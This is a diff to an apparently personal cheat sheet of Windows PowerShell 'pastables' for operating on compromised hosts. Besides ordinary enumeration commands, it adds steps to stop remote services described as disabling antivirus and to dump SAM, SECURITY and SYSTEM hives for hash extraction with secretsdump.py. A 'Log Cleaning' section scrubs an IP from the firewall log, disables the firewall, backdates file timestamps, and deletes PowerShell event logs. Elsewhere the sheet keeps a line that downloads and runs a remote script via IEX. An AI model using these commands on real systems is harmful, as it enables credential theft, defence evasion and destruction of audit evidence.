@@ -1,5 +1,14 @@
 Windows PowerShell Pastables 
 
+RDP
+X-----------------------------
+#Local
+mstsc.exe
+
+#Remote
+(ps & netstat -ano) | clip
+
+-----------------------------X
 
 Check PowerShell Logs with CMD
 X-----------------------------
@@ -71,7 +80,7 @@ remove-pssession -session $t1
 -----------------------------X
 
 
-PowerShell Utilty Tools
+PowerShell Utilty Commands
 X-----------------------------
 ### Ping Sweep 
 1..254 | {ping -n 1 -w 100 192.168.1.$_ | select-string ttl}; arp -a
@@ -99,11 +108,23 @@ IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps
 
 ### Copy to/from remote system using pssession (requires PowerShell 5 on attcker box
 copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
- 
+
+#Start a Remote Program
+Invoke-WmiMethod –ComputerName <MEMBERSRV1> -Class win32_process -Name create -ArgumentList "notepad"
+
+#Get servics and disable AV over network
+Get-WMIObject Win32_Service -Computer <RemoteComputerName> | Where {$_.State -eq "Running"} | FT -Auto
+(get-wmiobject -class Win32_service -Computer <RemoteComputer> | Where {$_.name -eq "<dhcp>"}).stopservice()
+
+# Get Sam/Hashes
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
 -----------------------------X
 
 
-Malware Traige 
+Malware Triage 
 X-----------------------------
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize						# What is the parent process?
 get-authenticodesignature <cmd path>														# Is the process signed
@@ -140,6 +161,7 @@ Write-Output "Currently have administrative rights:"; ([Security.Principal.Windo
 Gwmi Win32_OperatingSystem | Select-Object Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
 Get-Service | where-object { $_.Status -eq 'running' }
+gwmi win32_startupcommand | select-object name, command,location, user | format-list
 Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where-object { $_.IPAddress} | Format-Table
 gwmi win32_networkadapterconfiguration -Filter 'ipenabled = "true"'
 arp -a
@@ -149,28 +171,35 @@ get-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\
 get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"										# Windows Env variables
 get-itemproperty "HKCU:\network\*"																# list shares
 auditpol /get /catagory:*																	#lists audit polocies
-Drivers
+get-psdriver -psprovider filesystem
+Get-WmiObject Win32_PnPSignedDriver| select devicename, driverversion
+
+Get-NetFirewallPortFilter –Protocol TCP | select-object localport | Where { $_.localport –ne ‘any’ }
 
 Get-ChildItem -path C:\Windows\temp
------------------------------X                                                                                                                                                                                     
+-----------------------------X  
 
 
 Exit off Box
 X-----------------------------
+get-childitem -recurse -force -ea silentlycontinue -path c:\ -include *.wer, *.dump, *log
+
 Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }
 get-childitem -path c:\windows\prefetch
+gci -path c:\windows\temp
 gwmi win32_process | select-object processid, parentprocessid, commandline | format-table -autosize
 netstat -ano
 
------------------------------X                                                                                                                                                                                     
+-----------------------------X  
 
 
 Collection
 X-----------------------------
 get-childitem -recurse -path c:\ -include *.doc, *.docx 
 
-Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-120) }                           #liost files changed in last 2 hours
+Get-ChildItem -Path C:\ -recurse -force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddDays(-20) }                           #list files changed in last 2 hours
 
+gci -recurse -path C:\users\*\ | ogv
 -----------------------------X
 
 
@@ -196,4 +225,27 @@ $options=New-PSSessionOption -SkipCACheck -SkipCNCheck
 $cred = Get-Credential
 Enter-PSSession -ComputerName <hostname> -UseSSL -SessionOption $options -Credential $cred
 
+-----------------------------X
+
+
+Log Cleaning
+X-----------------------------
+get-content c:\windows\system32\logfiles\firewall\firewall.log
+Select-String -path c:\windows\system32\logfiles\firewall\firewall.log -Pattern "192.168.1.111" -notmatch | Foreach {$_.Line} > c:\windows\temp\sd_120.tmp
+ps                              #check for logon.scr, shutting down firewall will create a popup
+get-content c:\windows\temp\sd_120.tmp
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+copy c:\windows\temp\sd_120.tmp c:\windows\system32\logfiles\firewall\firewall.log
+get-content c:\windows\system32\logfiles\firewall\firewall.log
+$(get-item c:\windows\system32\logfiles\firewall\firewall.log).lastaccesstime=$(get-date "01/01/2019 06:00 am")
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled true
+
+
+#PowerShell Event Logs
+wevtutil gl microsoft-windows-powershell/operational        #check current settings
+wevtutil sl microsoft-windows-powershell/operational /lfn:"C:\Windows\Temp\pshell.evtx"       # set new location
+del %SystemRoot%\System32\Winevt\Logs\microsoft-windows-powershell%4operational.evtx
+wevtutil gl microsoft-windows-powershell/operational         # verify
+wevtutil sl microsoft-windows-powershell/operational /lfn:%SystemRoot%\System32\Winevt\Logs\microsoft-windows-powershell%4operational.evtx   #Move back
+del c:\windows\temp\security.evtx 
 -----------------------------X
